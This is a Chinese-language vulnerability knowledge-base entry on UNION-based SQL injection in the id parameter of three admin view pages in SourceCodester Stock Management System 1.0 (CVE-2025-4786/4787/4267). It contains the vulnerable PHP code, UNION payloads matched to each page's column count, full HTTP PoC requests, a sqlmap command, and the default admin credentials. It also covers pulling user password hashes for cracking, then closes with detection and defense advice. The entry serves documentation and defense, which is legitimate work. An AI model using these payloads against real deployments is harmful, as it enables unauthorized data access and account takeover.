---
id: web-generic-sqli-sourcecodester-stock-view-id-union
title: SourceCodester Stock Management System 1.0 后台三处 view 页面 id 参数 UNION 注入（CVE-2025-4786/4787/4267）
type: scenario
domain: web
path: web/generic/sqli
technique: php-admin-view-id-union-sqli
aliases:
- CVE-2025-4786
- CVE-2025-4787
- CVE-2025-4267
- Stock Management System SQL 注入
- view_return/view_sale/view_po id 注入
tags:
- php
- sql-injection
- union
- mysql
- sourcecodester
- stock-management
- cve-2025-4786
- cve-2025-4787
- cve-2025-4267
cve:
- CVE-2025-4786
- CVE-2025-4787
- CVE-2025-4267
severity: high
confidence: high
affected_versions: 1.0（原文受影响版本）
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V54
  verified_at: '2026-11-05T09:06:31+08:00'
  notes: 已对照原文及32张图核对：图07 view_return.php 直接拼接 $_GET['id']；图09 Burp 9 列 UNION 回显 sms_db；图13/15 view_sale.php 8 列 UNION 回显 sms_db；图27/29 view_po.php 13 列 UNION 回显 sms_db；图10/16/30 sqlmap 均枚举出 information_schema/mysql/performance_schema/sms_db/sys/wp。受影响版本 V1.0 为原文明确标注，已保留。PoC 未在本机执行。
---

## 一句话结论

SourceCodester Stock Management System 1.0 的 `admin/?page=return/view_return`、`admin/?page=sales/view_sale`、`admin/?page=purchase_order/view_po` 三个页面都把 `$_GET['id']` 直接拼进单引号 SQL，管理员登录后提交 `id=1' union select 1,database(),...-- -` 即可把数据库名回显到页面字段，并可进一步 UNION 读取任意表。

## 原理

- 三处代码结构相同，均未过滤或预处理：
  ```php
  // admin/return/view_return.php
  $qry = $conn->query("SELECT r.*,s.name as supplier FROM return_list r
                       inner join supplier_list s on r.supplier_id = s.id
                       where r.id = '{$_GET['id']}'");
  // admin/sales/view_sale.php
  $qry = $conn->query("SELECT * FROM sales_list r where id = '{$_GET['id']}'");
  // admin/purchase_order/view_po.php
  $qry = $conn->query("SELECT p.*,s.name as supplier FROM purchase_order_list p
                       inner join supplier_list s on p.supplier_id = s.id
                       where p.id = '{$_GET['id']}'");
  ```
- 页面随后执行 `foreach($qry->fetch_array() as $k=>$v){ $$k = $v; }`，把查询列直接变成 PHP 变量并在模板中输出。UNION 的第二行会被取到，注入的 `database()` 出现在 `Return Code`/`Sales Code`/`P.O. Code` 等字段。
- 三个查询的列数不同：`view_return` 9 列、`view_sale` 8 列、`view_po` 13 列（原文以 sqlmap 与手工 payload 确认），UNION 需按对应列数补齐。
- 入口在后台 `/admin/`，需要管理员会话；产品自带默认口令 `admin/admin123`（原文环境搭建使用），因此默认部署可直接登录后利用。

## 触发条件

- 目标为 Stock Management System 1.0（原文测试环境 Apache 2.4.39 / PHP 7.4.3 / MySQL 8.0.11）。
- 攻击者拥有后台会话（默认 `admin/admin123` 或已获取的账号）。
- 数据库为 MySQL/MariaDB，支持 UNION 与 `-- -`/`#` 注释。
- 对应页面可访问，id 参数未做类型校验。

## 利用步骤

1. 登录后台 `/admin/`，分别打开 Return List、Sale List、Purchase Order 的详情页，确认 URL 中的 `page=...&id=1`。
2. 按页面列数构造 UNION：
   - `view_return`（9 列）：`id=1' union select 1,database(),3,4,5,6,7,8,9 -- -`
   - `view_sale`（8 列）：`id=1' union select 1,database(),3,4,5,6,7,8 -- -`
   - `view_po`（13 列）：`id=2' union select 1,database(),3,4,5,6,7,8,9,10,11,12,13 -- -`
3. 页面字段回显数据库名（原文为 `sms_db`），确认注入。
4. 将 `database()` 替换为 `user()`、`version()`、`group_concat(table_name)` 或直接 UNION 读取 `users` 表账号。
5. 可用 sqlmap 复核：`sqlmap -u "http://target/admin/?page=return/view_return&id=1*" --cookie="PHPSESSID=..." --dbs --batch`，原文枚举出 `information_schema`、`mysql`、`performance_schema`、`sms_db`、`sys`、`wp`。

## PoC

```http
GET /admin/?page=return/view_return&id=1'%20union%20select%201,database(),3,4,5,6,7,8,9%20--%20- HTTP/1.1
Host: target
Cookie: PHPSESSID=<admin-session>
```

```http
GET /admin/?page=sales/view_sale&id=1'%20union%20select%201,database(),3,4,5,6,7,8%20--%20- HTTP/1.1
Host: target
Cookie: PHPSESSID=<admin-session>
```

```http
GET /admin/?page=purchase_order/view_po&id=2'%20union%20select%201,database(),3,4,5,6,7,8,9,10,11,12,13%20--%20- HTTP/1.1
Host: target
Cookie: PHPSESSID=<admin-session>
```

响应页面中的 `Return Code`、`Sales Code`、`P.O. Code` 字段显示数据库名。

## 变体与关联

- 变体：布尔盲注/时间盲注（`AND SLEEP(5)`）、报错注入、堆叠查询，取决于数据库权限与 `mysqli_query` 行为。
- 变体：UNION 读取 `users` 表的用户名与 MD5 口令，再离线破解或直接登录。
- 关联：[[web-generic-sqli-sourcecodester-stock-login-time-blind]]（同产品登录处 username 时间盲注）、[[web-generic-sqli-phpgurukul-student-record-login-union]]（同类 PHP 登录 UNION 注入）。

## 检测与防御

- 检测：后台详情页请求的 id 参数出现单引号、`union select`、`database()`、`sleep(`；页面字段回显数据库名/函数结果；sqlmap 特征 User-Agent 与高频请求。
- 防御：`$id = intval($_GET['id'])` 并校验大于 0；使用 `prepare` + `bind_param` 参数化查询。
- 防御：后台默认口令必须修改；限制 `/admin/` 来源 IP；数据库账号最小权限。
- 防御：不要用 `$$k = $v` 把查询列直接展开为变量，模板输出前显式赋值并转义。
